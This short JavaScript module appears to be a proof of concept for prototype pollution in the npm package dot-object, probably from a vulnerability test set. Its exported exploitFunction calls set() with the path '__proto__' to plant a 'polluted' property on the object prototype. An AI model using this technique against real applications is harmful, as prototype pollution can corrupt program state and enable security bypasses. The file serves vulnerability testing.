function exploitFunction(obj) {
    var a = require("dot-object");

    var path = "__proto__";
    var val = { polluted: "yes" };
    a.set(path, val, obj, true);

    return obj;
}

module.exports = { exploitFunction };